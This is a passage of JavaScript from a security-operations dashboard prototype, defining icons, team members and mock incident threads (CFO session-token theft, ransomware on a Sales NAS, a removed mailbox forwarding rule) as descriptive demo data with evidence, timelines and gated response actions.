  gauge:I('<path d="M12 14 9 9M3.3 19a9 9 0 1 1 17.4 0z"/>'),
  bot:I('<rect x="4" y="8" width="16" height="11" rx="2.5"/><path d="M12 8V4.5M8.5 4.5h7"/><circle cx="9.2" cy="13.2" r="1.1"/><circle cx="14.8" cy="13.2" r="1.1"/>'),
  workflow:I('<rect x="3" y="3" width="6.5" height="5" rx="2.5"/><rect x="14.5" y="16" width="6.5" height="5" rx="2.5"/><path d="M9.5 5.5h6a3.25 3.25 0 0 1 0 6.5h-7a3.25 3.25 0 0 0 0 6.5h6"/>'),
  pulse:I('<path d="M3 12h3.5l2-6.5 4 13 2-6.5H21"/>'),
  deploy:I('<path d="m4.5 16.5 5-5M12 2l1.5 4.5L18 8l-4.5 1.5L12 14l-1.5-4.5L6 8l4.5-1.5z" /><path d="M16 16l2 6 2-6"/>'),
  code:I('<path d="m16 18 6-6-6-6M8 6l-6 6 6 6"/>'),
  trace:I('<circle cx="5" cy="6" r="2"/><circle cx="19" cy="18" r="2"/><path d="M7 6h6a3 3 0 0 1 3 3v6"/><path d="M9 9v9"/>'),
  at:I('<circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/>'),
  cube:I('<path d="M21 7.5 12 2 3 7.5v9L12 22l9-5.5z"/><path d="M12 22V12M21 7.5 12 12 3 7.5"/>'),
  compass:I('<circle cx="12" cy="12" r="9"/><path d="m15.6 8.4-2.1 5.1-5.1 2.1 2.1-5.1z"/>'),
  list:I('<path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/>'),
  entities:I('<circle cx="6" cy="6.5" r="2.4"/><circle cx="18" cy="7.5" r="2.4"/><circle cx="12" cy="17.5" r="2.4"/><path d="M8.1 7.4 10.7 15M15.7 9 13 15.3M8.3 6.7 15.7 7.4"/>'),
  grid:I('<rect x="3" y="3" width="8" height="8" rx="1"/><rect x="13" y="3" width="8" height="5" rx="1"/><rect x="13" y="10" width="8" height="11" rx="1"/><rect x="3" y="13" width="8" height="8" rx="1"/>'),
  maximize:I('<path d="M8 3H5a2 2 0 0 0-2 2v3M16 3h3a2 2 0 0 1 2 2v3M21 16v3a2 2 0 0 1-2 2h-3M3 16v3a2 2 0 0 0 2 2h3"/>'),
  minimize:I('<path d="M3 8h3a2 2 0 0 0 2-2V3M21 8h-3a2 2 0 0 1-2-2V3M3 16h3a2 2 0 0 1 2 2v3M21 16h-3a2 2 0 0 0-2 2v3"/>'),
  chevron:I('<path d="m6 9 6 6 6-6"/>'),
  dashboards:`<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6 11C6.55228 11 7 11.4477 7 12V14L6.99512 14.1025C6.94379 14.6067 6.51768 15 6 15H2C1.44772 15 1 14.5523 1 14V12C1 11.4477 1.44772 11 2 11H6ZM2 14H6V12H2V14Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M14 6C14.5523 6 15 6.44772 15 7V14C15 14.5523 14.5523 15 14 15H9C8.44772 15 8 14.5523 8 14V7C8 6.44772 8.44772 6 9 6H14ZM9 14H14V7H9V14Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M6 6C6.55228 6 7 6.44772 7 7V9L6.99512 9.10254C6.94379 9.60667 6.51768 10 6 10H2C1.44772 10 1 9.55229 1 9V7C1 6.44772 1.44772 6 2 6H6ZM2 9H6V7H2V9Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M14 1C14.5177 1 14.9438 1.39333 14.9951 1.89746L15 2V4C15 4.55228 14.5523 5 14 5H2C1.44772 5 1 4.55228 1 4V2C1 1.44772 1.44772 1 2 1H14ZM2 4H14V2H2V4Z"/></svg>`,
};
const ICON_SPRITE = `<path fill-rule="evenodd" clip-rule="evenodd" d="M10.7764 4.55273C10.9689 4.45649 11.2013 4.4943 11.3535 4.64648C11.5057 4.79866 11.5435 5.03114 11.4473 5.22363L9.44727 9.22363C9.39888 9.3204 9.3204 9.39888 9.22363 9.44727L5.22363 11.4473C5.03114 11.5435 4.79866 11.5057 4.64648 11.3535C4.4943 11.2013 4.45649 10.9689 4.55273 10.7764L6.55273 6.77637C6.60112 6.6796 6.6796 6.60112 6.77637 6.55273L10.7764 4.55273ZM7.37207 7.37207L6.11816 9.88184L8.62695 8.62695L9.88184 6.11816L7.37207 7.37207Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M8 1C11.866 1 15 4.13401 15 8C15 11.866 11.866 15 8 15C4.13401 15 1 11.866 1 8C1 4.13401 4.13401 1 8 1ZM8.5 3H7.5V2.02246C4.58523 2.263 2.263 4.58523 2.02246 7.5H3V8.5H2.02246C2.263 11.4147 4.58527 13.736 7.5 13.9766V13H8.5V13.9766C11.4147 13.736 13.737 11.4147 13.9775 8.5H13V7.5H13.9775C13.737 4.58523 11.4148 2.263 8.5 2.02246V3Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M6 74C6.55228 74 7 74.4477 7 75V77L6.99512 77.1025C6.94379 77.6067 6.51768 78 6 78H2C1.44772 78 1 77.5523 1 77V75C1 74.4477 1.44772 74 2 74H6ZM2 77H6V75H2V77Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M14 69C14.5523 69 15 69.4477 15 70V77C15 77.5523 14.5523 78 14 78H9C8.44772 78 8 77.5523 8 77V70C8 69.4477 8.44772 69 9 69H14ZM9 77H14V70H9V77Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M6 69C6.55228 69 7 69.4477 7 70V72L6.99512 72.1025C6.94379 72.6067 6.51768 73 6 73H2C1.44772 73 1 72.5523 1 72V70C1 69.4477 1.44772 69 2 69H6ZM2 72H6V70H2V72Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M14 64C14.5177 64 14.9438 64.3933 14.9951 64.8975L15 65V67C15 67.5523 14.5523 68 14 68H2C1.44772 68 1 67.5523 1 67V65C1 64.4477 1.44772 64 2 64H14ZM2 67H14V65H2V67Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M8 127C9.75277 127 11.354 127.645 12.582 128.71L13.6465 127.646L14.3535 128.354L13.2891 129.417C14.3542 130.645 15 132.247 15 134C15 137.866 11.866 141 8 141C4.13401 141 1 137.866 1 134C1 130.134 4.13401 127 8 127ZM8 128C4.68629 128 2 130.686 2 134C2 137.314 4.68629 140 8 140C11.3137 140 14 137.314 14 134C14 132.523 13.4652 131.171 12.5801 130.126L8.96484 133.741C8.98695 133.824 9 133.91 9 134C9 134.552 8.55228 135 8 135C7.44772 135 7 134.552 7 134C7 133.448 7.44772 133 8 133C8.0892 133 8.17551 133.012 8.25781 133.034L9.01367 132.278C8.24687 131.826 7.24458 131.927 6.58594 132.586C5.80489 133.367 5.8049 134.633 6.58594 135.414L5.87891 136.121C4.70735 134.95 4.70734 133.05 5.87891 131.879C6.92982 130.828 8.56575 130.72 9.7373 131.555L10.4512 130.841C8.88199 129.62 6.61402 129.73 5.17188 131.172C3.60978 132.734 3.60979 135.266 5.17188 136.828C5.95302 137.609 6.97554 138 8 138V138.999C6.72116 138.999 5.44106 138.511 4.46484 137.535C2.51223 135.583 2.51223 132.417 4.46484 130.465C6.29799 128.632 9.20007 128.519 11.1641 130.128L11.873 129.419C10.8278 128.534 9.47658 128 8 128Z" fill="currentColor"/><path d="M9 201C9 201.552 8.55228 202 8 202C7.44772 202 7 201.552 7 201C7 200.448 7.44772 200 8 200C8.55228 200 9 200.448 9 201Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 199V194H8.5V199H7.5Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M8 190C8.35567 190 8.68457 190.189 8.86378 190.496L15.8638 202.496C16.0442 202.805 16.0455 203.188 15.8671 203.498C15.6888 203.809 15.3581 204 15 204H1C0.641935 204 0.311196 203.809 0.132858 203.498C-0.0454804 203.188 -0.0441976 202.805 0.136221 202.496L7.13622 190.496C7.31543 190.189 7.64433 190 8 190ZM1 203H15L8 191L1 203Z" fill="currentColor"/><path d="M10 253C10.3466 253 10.6684 253.18 10.8506 253.475C11.0327 253.769 11.0495 254.137 10.8945 254.447L9.61817 257H12C12.3924 257 12.748 257.23 12.9102 257.587C13.0722 257.944 13.0111 258.363 12.7529 258.658L5.75293 266.658C5.43932 267.017 4.91616 267.104 4.50293 266.867C4.08982 266.63 3.90118 266.135 4.05176 265.684L5.61329 261H4C3.65343 261 3.33163 260.82 3.14942 260.525C2.96734 260.231 2.95052 259.863 3.10547 259.553L6.10547 253.553L6.17676 253.432C6.36169 253.164 6.66855 253 7 253H10ZM7 254L4 260H7L5 266L12 258H8L10 254H7Z" fill="currentColor"/><path d="M8 332C8.85836 332 9.68053 332.155 10.4404 332.438L9.64746 333.23C9.12388 333.081 8.57146 333 8 333C4.68629 333 2 335.686 2 339C2 342.314 4.68629 345 8 345C11.3137 345 14 342.314 14 339C14 338.428 13.918 337.875 13.7686 337.352L14.5615 336.559C14.8445 337.319 15 338.141 15 339C15 342.866 11.866 346 8 346C4.13401 346 1 342.866 1 339C1 335.134 4.13401 332 8 332Z" fill="currentColor"/><path d="M8 335C8.3453 335 8.68038 335.044 9 335.126V335.879L8.77441 336.104C8.52717 336.038 8.26802 336 8 336C6.34315 336 5 337.343 5 339C5 340.657 6.34315 342 8 342C9.65685 342 11 340.657 11 339C11 338.732 10.9616 338.472 10.8955 338.225L11.1211 338H11.874C11.9563 338.32 12 338.655 12 339C12 341.209 10.2091 343 8 343C5.79086 343 4 341.209 4 339C4 336.791 5.79086 335 8 335Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M13 334H15.707L12.707 337H10.707L8.96484 338.741C8.98695 338.824 9 338.91 9 339C9 339.552 8.55228 340 8 340C7.44772 340 7 339.552 7 339C7 338.448 7.44772 338 8 338C8.0892 338 8.17551 338.012 8.25781 338.034L9.73633 336.556L10 336.293V334.293L13 331.293V334ZM11 334.707V336H12.293L12.8389 335.453L13.293 335H12V333.707L11 334.707Z" fill="currentColor"/><path d="M8 404C8.55228 404 9 404.448 9 405C9 405.552 8.55228 406 8 406C7.44772 406 7 405.552 7 405C7 404.448 7.44772 404 8 404Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M10 395C10.2652 395 10.5195 395.105 10.707 395.293C10.8946 395.481 11 395.735 11 396V398H14C14.5523 398 15 398.448 15 399V408C15 408.265 14.8946 408.519 14.707 408.707C14.5195 408.895 14.2652 409 14 409H2C1.44773 409 1.00003 408.552 1 408V399C1 398.448 1.44772 398 2 398H5V396C5.00003 395.448 5.44778 395 6 395H10ZM2 408H14V403H2V408ZM2 402H14V399H2V402ZM6 398H10V396H6V398Z" fill="currentColor"/><path d="M2 471H15V472H2C1.44772 472 1 471.552 1 471V458H2V471Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M5 464C5.55228 464 6 464.448 6 465V469C6 469.552 5.55228 470 5 470H4C3.44772 470 3 469.552 3 469V465C3 464.448 3.44772 464 4 464H5ZM4 469H5V468H4V469ZM4 467H5V465H4V467Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M9 462C9.55228 462 10 462.448 10 463V469C10 469.552 9.55228 470 9 470H8C7.44772 470 7 469.552 7 469V463C7 462.448 7.44772 462 8 462H9ZM8 469H9V466H8V469ZM8 465H9V463H8V465Z" fill="currentColor"/><path fill-rule="evenodd" clip-rule="evenodd" d="M13 460C13.5523 460 14 460.448 14 461V469C14 469.552 13.5523 470 13 470H12C11.4477 470 11 469.552 11 469V461C11 460.448 11.4477 460 12 460H13ZM12 469H13V464H12V469ZM12 463H13V461H12V463Z" fill="currentColor"/>`;
const S16 = (y)=>`<svg width="16" height="16" viewBox="0 ${y} 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">${ICON_SPRITE}</svg>`;
Object.assign(ICON, {
  'sx-discover':    S16(0),
  'sx-dashboards':  S16(63),
  'sx-hunt':        S16(126),
  'sx-alerts':      S16(189),
  'sx-streams':     S16(252),
  'sx-automations': S16(330),
  'sx-records':     S16(394),
  'sx-activity':    S16(457),
});
function ic(name,sz){ let s = ICON[name]||''; if(sz) s = s.replace('width="16" height="16"',`width="${sz}" height="${sz}"`); return s; }

/* ============================================================ STATE & DATA */
const PEOPLE = {
  you:{init:'YU',name:'You',role:'Senior Analyst',color:'linear-gradient(135deg,#3a4150,#22262e)',photo:'avatars/you.jpg'},
  maya:{init:'MC',name:'Maya Chen',role:'Incident Response Lead',color:'linear-gradient(135deg,#c2410c,#9a3412)',photo:'avatars/maya.jpg'},
  tom:{init:'TO',name:'Tom Okafor',role:'Tier-2 Analyst',color:'linear-gradient(135deg,#0e7490,#155e75)',photo:'avatars/tom.jpg'},
  priya:{init:'PN',name:'Priya Nair',role:'Detection Engineer',color:'linear-gradient(135deg,#7c3aed,#5b21b6)',photo:'avatars/priya.jpg'},
  nightshift:{init:'NS',name:'NightShift',role:'Autonomous agent',color:'linear-gradient(135deg,#7b6ce8,#564ab6)',agent:true},
  daybreak:{init:'DB',name:'NotDaybreak',role:'Autonomous agent',color:'linear-gradient(135deg,#0b64dd,#0a4fb0)',agent:true},
};
const TYPE_META = {
  chat:{label:'Chat',color:'var(--ink-4)',icon:'sparkle'},
  case:{label:'Case',color:'var(--t-case)',icon:'briefcase'},
  investigation:{label:'Investigation',color:'var(--t-inv)',icon:'investigation'},
  hunt:{label:'Threat Hunt',color:'var(--t-hunt)',icon:'target'},
  incident:{label:'Incident',color:'var(--t-incident)',icon:'siren'},
  custom:{label:'Custom',color:'var(--t-custom)',icon:'layers'},
};
const STATUS_DOT = {open:'var(--blue)','in-progress':'var(--amber)',contained:'var(--green)',resolved:'var(--green)','auto-resolved':'var(--teal,#0B8A85)','awaiting':'var(--violet)',closed:'var(--ink-4)'};
const STATUS_LABEL = {open:'Open','in-progress':'In progress',contained:'Contained',resolved:'Resolved','auto-resolved':'Resolved autonomously','awaiting':'Awaiting review',closed:'Closed'};
const SEV = {High:{c:'var(--amber)',bg:'var(--amber-bg)'},Critical:{c:'var(--red)',bg:'var(--red-bg)'},Medium:{c:'#d4791a',bg:'#fbeede'},Low:{c:'var(--blue)',bg:'var(--blue-bg)'}};

let state = {};
function freshState(){
  return {
    mode:'dayshift',
    autonomy:{dayshift:4,nightshift:3,fraud:1,floor:3,officer:4,dark:5,deep:3},
    inspectorOpen:false,
    panelApps:['object'],
    activeApp:'object',
    panelWidth:440,
    panelMax:false,
    activeId:'day-1',
    dayStep:0,
    allowIsolate:false,
    inspectorTab:'overview',
    discoverField:null,
    recordsView:'all',
    recordsQuery:'',
    recordsSort:{key:'updated',dir:'desc'},
    dest:'home',
    navView:'brief',
    cards:{},
    collapsedDec:{suppress:true, monitor:true, dismiss:true},
    chatPinned:false,
    nav:{ showLabels:true, showSecondary:true, agentMode:false, apps:[
      {key:'discover',label:'Discover',icon:'sx-discover',locked:true,visible:true,group:'operate'},
      {key:'dashboards',label:'Dashboards',icon:'sx-dashboards',locked:false,visible:true,group:'operate'},
      {key:'alerts',label:'Alerts',icon:'sx-alerts',locked:false,visible:true,group:'operate'},
      {key:'discoveries',label:'Attacks',icon:'siren',locked:false,visible:true,group:'operate'},
      {key:'records',label:'Records',icon:'sx-records',locked:false,visible:true,group:'operate'},
      {key:'hunt',label:'Threat hunt',icon:'sx-hunt',locked:false,visible:true,group:'operate'},
      {key:'streams',label:'Streams',icon:'sx-streams',locked:false,visible:true,group:'operate'},
      {key:'agents',label:'Watches',icon:'eye',locked:false,visible:true,group:'agent'},
    ]},
    threads:{
      // DAYSHIFT
      'day-1':{ id:'day-1', mode:'dayshift', type:'chat', title:'New chat', messages:[], suggestions:[],
                status:null, severity:null, owner:'you', assignees:[], mentions:[], evidence:[], timeline:[], actions:[], narrative:'', recordId:null },
      'day-amb1':{ id:'day-amb1', mode:'dayshift', type:'case', title:'Phishing — invoice lure (Finance)', recordId:'CASE-2038',
                status:'resolved', severity:'Medium', owner:'maya', assignees:['priya'], mentions:[], stub:true,
                messages:[{role:'system',evt:'case',text:'Case resolved 2 days ago',id:'CASE-2038'}],
                evidence:[], timeline:[], actions:[], narrative:'Targeted invoice-themed phishing against 4 Finance users. 1 credential submission, password reset enforced, no follow-on activity. Closed as resolved.' },
      'day-amb2':{ id:'day-amb2', mode:'dayshift', type:'chat', title:'DNS anomaly — egress poke', recordId:null,
                status:null, severity:null, owner:'you', assignees:[], mentions:[], stub:true,
                messages:[{role:'agent',prose:'I looked at the NXDOMAIN spike on the guest VLAN — it traces to a misconfigured IoT thermostat, not exfil. Nothing to escalate.'}],
                evidence:[], timeline:[], actions:[], narrative:'' },
      'day-r1':{ id:'day-r1', mode:'dayshift', type:'incident', title:'Ransomware containment — Sales file server', recordId:'INC-2031',
                status:'resolved', severity:'Critical', owner:'maya', assignees:['priya','tom'], mentions:[], stub:true, updated:'2d ago', commander:'maya',
                messages:[{role:'system',evt:'incident',text:'Incident resolved',id:'INC-2031'}],
                evidence:[], timeline:[], actions:[], narrative:'Ransomware detected on the Sales file server; host isolated within 6 minutes, no encryption spread beyond the single endpoint. Restored from backup. Closed as resolved.' },
      'day-r2':{ id:'day-r2', mode:'dayshift', type:'hunt', title:'Noisy rule — "Unusual port for process"', recordId:'RULE-1182',
                status:'open', severity:'Low', owner:'priya', assignees:[], mentions:[], stub:true, updated:'4h ago',
                messages:[{role:'agent',prose:'The "Unusual port for process" rule fired 1,240× in 24h — every hit traces to the authorized Qualys scanner sweeping the DMZ. I can scope a monitored exception and estimate the volume drop.'}],
                evidence:[], timeline:[], actions:[], narrative:'Noisy detection rule firing on authorized scanner activity. A scoped, monitored exception would cut ~98% of the volume with a reversible path.' },
      'day-r3':{ id:'day-r3', mode:'dayshift', type:'case', title:'Impossible travel — exec account (cfo@corp)', recordId:'CASE-2047',
                status:'open', severity:'High', owner:'you', assignees:[], mentions:[], stub:true, updated:'1h ago',
                messages:[{role:'agent',prose:`Two sign-ins for <b>cfo@corp</b> from different countries inside 40 minutes — and <b>MFA was satisfied in both</b>. That's the ambiguous part: it reads as either the exec travelling behind a VPN, or a <b>stolen session token</b>. This one's your call. Ask me anything — type a question or tap a lead — and I'll pull the evidence, or tell me to contain it.`}],
                mitre:['T1078.004','T1550.004','T1539','T1114.003'],
                impact:{stages:[
                  {k:'Entry point',nodes:[['network','AitM proxy — AS20473','session cookie replayed · hosting ASN','risk','active']]},
                  {k:'Compromised',nodes:[['user','cfo@corp','MFA satisfied via stolen token','risk','exposed']]},
                  {k:'Blast radius',nodes:[['at','3 live sessions','Okta web · Outlook · iOS mail','risk','exposed'],['doc','Mailbox rule','fwd → external · 0 sent','watch','caught early'],['host','SSO downstream apps','issued off the Okta session','watch','at risk']]},
                ]},
                situation:`At 09:02 UTC <code>cfo@corp</code> signed in from <b>Boston, US</b>; at 09:41 a second sign-in landed from a <b>hosting/VPN ASN</b> ~7,000 km away. MFA was satisfied both times, so a naive read is "impossible travel, but MFA held." The tell is that the second sign-in <b>replayed the same session cookie</b> rather than completing a fresh challenge — the signature of an adversary-in-the-middle <b>session-token theft</b>, not a guessed password. The CFO's live sessions across Okta and Microsoft 365 are the blast radius.`,
                evidence:[
                  {id:'ev-travel',t:'Impossible travel — two sign-ins, 40 min apart',src:'Discover · sign-in logs',icon:'network',mv:'geo.distance',snap:'Boston, US 09:02 UTC → AS20473 09:41 UTC\n≈7,000 km · 39 min apart',live:'both sessions live',liveGood:false,why:'≈7,000 km in 39 minutes is physically impossible — two actors on one identity.'},
                  {id:'ev-token',t:'Session cookie replayed, no fresh MFA',src:'Okta · system log (token)',icon:'lock',mv:'authn.token',snap:'sid …a1f reused from both IPs\n2nd sign-in: MFA satisfied via existing token, no challenge',live:'token still valid',liveGood:false,why:'A traveller re-authenticates; a replayed cookie with no new prompt is adversary-in-the-middle theft.'},
                  {id:'ev-asn',t:'Second IP is bulletproof hosting',src:'Threat intel · ASN',icon:'db',mv:'source.as',snap:'AS20473 · hosting / anonymizer range\nno prior sign-in history for cfo@corp',live:'flagged',liveGood:false,why:'Executives sign in from a corp VPN or known ISP — not a first-seen hosting ASN.'},
                  {id:'ev-sessions',t:'3 active sessions across Okta + M365',src:'Okta + M365 · sessions',icon:'user',mv:'session.count',snap:'Okta web · Outlook desktop · iOS mail\nall issued before the anomaly',live:'3 live',liveGood:false,why:'This is the blast radius — every live token an attacker could ride.'},
                  {id:'ev-rule',t:'New external forwarding rule',src:'M365 · New-InboxRule',icon:'doc',mv:'mailbox.rule',snap:'Rule fwd → external, created 09:43 UTC\n0 messages forwarded so far',live:'rule live',liveGood:false,why:'Created inside the suspect session — an exfil setup, caught before mail left.'},
                ],
                timeline:[
                  {time:'09:02',cls:'',txt:'Sign-in for <code>cfo@corp</code> from <b>Boston, US</b> (MFA satisfied)'},
                  {time:'09:41',cls:'crit',txt:'Second sign-in from <b>AS20473</b> — <b>session cookie replayed</b>, no fresh MFA'},
                  {time:'09:43',cls:'flag',txt:'New external <b>forwarding rule</b> created in the session'},
                  {time:'now',cls:'now',txt:'<b>CASE-2047</b> open — your call'},
                ],
                hypotheses:[{id:'h-token',statement:`The impossible travel is <b>session-token theft</b> (adversary-in-the-middle), not a password compromise — the second sign-in replayed a stolen cookie instead of re-authenticating.`,author:'daybreak',state:'investigating',confidence:'moderate',forIds:['ev-travel','ev-token']}],
                qa:[
                  {id:'q-travel',chip:`Is this just travel on a VPN?`,q:`Could this just be the CFO travelling on a VPN?`,evId:'ev-asn',
                   answer:`Unlikely. The second sign-in came from <b>AS20473</b> — a hosting/anonymizer range with <b>no prior history</b> for this user, not a corporate VPN. And a traveller re-authenticates; here the <b>same session cookie was replayed</b> byte-for-byte from both locations. That's theft, not travel.`},
                  {id:'q-mfa',chip:`Was MFA re-prompted?`,q:`Was MFA actually re-prompted on the second sign-in?`,evId:'ev-token',
                   answer:`No. The second sign-in <b>satisfied MFA via the existing token</b> — no fresh challenge. A replayed cookie with no new prompt is the signature of an <b>adversary-in-the-middle</b> session hijack, which is exactly why "MFA was satisfied" is misleading here.`},
                  {id:'q-blast',chip:`What's the blast radius?`,q:`How many live sessions are exposed?`,evId:'ev-sessions',
                   answer:`<b>3 active sessions</b> — Okta web, Outlook desktop, and iOS mail, all issued before the anomaly. That's the blast radius: revoking sessions kills all three at once and forces re-auth across Okta + M365.`},
                  {id:'q-activity',chip:`Has anything happened in-session?`,q:`Has the attacker done anything in the session yet?`,evId:'ev-rule',
                   answer:`Yes — at <b>09:43</b> a new <b>external forwarding rule</b> was created on the mailbox. <b>Nothing has been forwarded yet</b>, so we've caught it early, but it confirms hands-on activity. Containing now stops it before mail leaves.`},
                ],
                answered:[],
                recActions:[ {label:'Revoke active sessions',icon:'lock',gated:true}, {label:'Force password + MFA reset',icon:'shield',gated:true}, {label:'Assign to IR',icon:'users',gated:false} ],
                evidenceTabReady:true, actions:[],
                assessment:`Likely session-token theft on cfo@corp — impossible travel with a replayed cookie, not a password compromise. Live sessions are exposed and not contained.`, assessmentTone:'warn',
                callout:{tone:'warn',icon:'warn',text:`Three sessions for cfo@corp are live and a forwarding rule was just created. Revoke the sessions to cut the attacker's access.`},
                narrative:'cfo@corp signed in from geographically impossible locations within 40 minutes. MFA satisfied in both — likely session-token theft. Live sessions exposed; not yet contained.' },
      'day-r4':{ id:'day-r4', mode:'dayshift', type:'case', title:'Suspicious OAuth consent grant', recordId:'CASE-2039',
                status:'in-progress', severity:'Medium', owner:'tom', assignees:['priya'], mentions:[], stub:true, updated:'yesterday',
                messages:[{role:'agent',prose:'A user consented to an unverified third-party app requesting mailbox.read. Consent revoked; reviewing access logs.'}],
                evidence:[], timeline:[], actions:[], narrative:'User granted OAuth consent to an unverified app requesting broad mailbox scopes. Consent revoked; reviewing access logs for exfiltration.' },
      'day-r5':{ id:'day-r5', mode:'dayshift', type:'incident', title:'Mass file encryption — Sales NAS share', recordId:'INC-2042',
                status:'open', severity:'Critical', owner:'you', assignees:[], mentions:[], stub:true, updated:'7h ago',
                messages:[{role:'agent',prose:'Encryption hit the Sales NAS at 02:31 — 1,431 files renamed in four minutes before the writing process died. Spread stayed local to one share overnight; the share is still exposed. I can isolate it before restore.'}],
                evidence:[
                  {id:'ev-enc',t:'Mass file rename — .lkx extension',src:'Endpoint · file events (Sales-NAS)',icon:'db',mv:'file.rename',snap:'1,431 files renamed to .lkx\n02:31–02:35 UTC · 4 min',live:'renames stopped',liveGood:true,why:'Bulk rename at machine speed is the signature of ransomware encryption.'},
                  {id:'ev-proc',t:'Writing process on FIN-WS-22',src:'Endpoint · process (FIN-WS-22)',icon:'terminal',mv:'process',snap:'unknown.exe writing over SMB to \\\\Sales-NAS\\share',live:'process ended',liveGood:true,why:'A single workstation drove the encryption over the file share.'},
                  {id:'ev-spread',t:'Spread still local to one share',src:'Network · SMB flows',icon:'network',mv:'smb.targets',snap:'Only \\\\Sales-NAS\\share affected · no other shares touched',live:'contained',liveGood:true,why:'Isolating the NAS stops spread before it reaches other shares.'},
                  {id:'ev-snap',t:'Clean snapshot available',src:'Backup · SNAP-7740',icon:'shield',mv:'backup',snap:'Last good snapshot 01:00 UTC · restorable',live:'restorable',liveGood:true,why:'Recovery path exists — data is restorable post-containment.'},
                ],
                timeline:[
                  {time:'02:31',cls:'crit',txt:'<b>Mass rename begins</b> on Sales-NAS (.lkx)'},
                  {time:'02:35',cls:'',txt:'1,431 files renamed · spread local to one share'},
                  {time:'now',cls:'now',txt:'<b>INC-2042</b> open — isolate the share before restore'},
                ],
                impact:{stages:[
                  {k:'Entry point',nodes:[['host','FIN-WS-22','encryption source · isolating now','watch','isolating']]},
                  {k:'Impacted',nodes:[['db','Sales-NAS share','1,431 files renamed in 4 min','risk','impacted']]},
                  {k:'Spread checked',nodes:[['host','Adjacent shares','no writes observed overnight','ok','clean'],['user','svc-backup','writing process died 02:35','ok','contained']]},
                ]},
                actions:[], narrative:'Ransomware-style mass file encryption on the Sales NAS share at 02:31. 1,431 files renamed with a .lkx extension over 4 minutes; the writing process died and spread stayed local to the single share. Isolation pending before restore.' },
      'day-r6':{ id:'day-r6', mode:'dayshift', type:'case', title:'Privilege escalation — svc-helpdesk → Domain Admins', recordId:'CASE-2051',
                status:'open', severity:'High', owner:'you', assignees:[], mentions:[], stub:true, updated:'11m ago',
                messages:[{role:'agent',prose:'svc-helpdesk was added to Domain Admins at 02:43 — inside the FIN-WS-04 attack window, outside any change ticket. The morning sweep surfaced it 11 minutes ago.'}],
                evidence:[], timeline:[], actions:[], narrative:'Unauthorized privilege escalation: svc-helpdesk added to Domain Admins at 02:43, during the FIN-WS-04 intrusion — no change ticket. Surfaced by the morning sweep.' },
      'day-auto1':{ id:'day-auto1', mode:'dayshift', type:'case', title:'Mailbox exfil rule auto-removed — j.reyes', recordId:'CASE-2043', digest:'removed a mailbox exfil rule on j.reyes',
                status:'auto-resolved', severity:'High', owner:'daybreak', assignees:[], mentions:[], agentInitiated:true, autoResolved:true, stub:true, updated:'03:12',
                messages:[{role:'agent',prose:'Dark Watch caught a mailbox forwarding rule exfiltrating j.reyes mail to a personal Gmail, confirmed the account was compromised, and removed the rule autonomously — 0 messages forwarded.'}],
                evidence:[
                  {id:'ev-rule',t:'External forwarding rule → personal Gmail',src:'Discover · New-InboxRule',mv:'rule.forward_to',icon:'db',why:'All mail forwarded externally with delete-after-forward on',snap:'Rule → jreyes.personal@gmail.com\ncreated 03:04 UTC',live:'rule removed 03:11 — no longer present',liveGood:true},
                  {id:'ev-geo',t:'Sign-in from an unfamiliar geo (Lagos, NG)',src:'Discover · sign-in logs',mv:'source.geo.country',icon:'network',why:'No prior sign-in history from this country',snap:'Successful sign-in 03:02 UTC, MFA satisfied',live:'no further sign-ins from NG',liveGood:true},
                  {id:'ev-pto',t:'User on PTO all week',src:'Entities · calendar',mv:'user.presence',icon:'user',why:'Legitimate activity is highly unlikely during PTO',snap:'j.reyes: out-of-office, full week',live:'out-of-office through Friday',liveGood:true},
                  {id:'ev-replay',t:'Token-replay match to the phishing wave',src:'Cases · related',mv:'session.token_hash',icon:'clip',why:'Session cookie matches the stolen-cookie pattern',snap:'Matches CASE-2049 replay pattern',live:'pattern still matches CASE-2049',liveGood:true},
                ],
                timeline:[
                  {time:'03:04',txt:'Dark Watch detected a new external forwarding rule on j.reyes@corp'},
                  {time:'03:08',txt:'Confirmed compromise — Lagos sign-in, user on PTO, token-replay match to CASE-2049'},
                  {time:'03:11',cls:'ok',txt:'<b>Forwarding rule removed</b> — 0 messages forwarded'},
                  {time:'03:12',cls:'ok',txt:'CASE-2043 opened and resolved autonomously'},
                ],
                actions:[
                  {kind:'disable',title:'Removed the forwarding rule',sub:'Deleted the auto-forward + delete-after-forward rule on j.reyes@corp',status:'done',time:'03:11',by:'daybreak',reversible:true},
                  {kind:'incident',title:'Opened + closed CASE-2043',sub:'Case created with evidence attached, then resolved autonomously',status:'done',time:'03:12',by:'daybreak'},
                ],
                questions:['Should j.reyes\'s password and active sessions be reset as a precaution?','Do any other mailboxes carry the same forwarding-rule pattern?'],
                assessment:'Contained autonomously — the malicious forwarding rule was removed before any mail was forwarded. No further action required.', assessmentTone:'ok',
                callout:{tone:'ok',icon:'check',text:'Resolved by Dark Watch under its allow-list. Reversible — the original rule is preserved in the case audit trail.'},
                narrative:'A malicious auto-forwarding rule on the j.reyes mailbox (created from a Lagos, NG sign-in while the user was on PTO) was matched to this week\'s phishing-wave token replay and removed autonomously under NotDaybreak\'s allow-list. No mail was delivered externally.' },
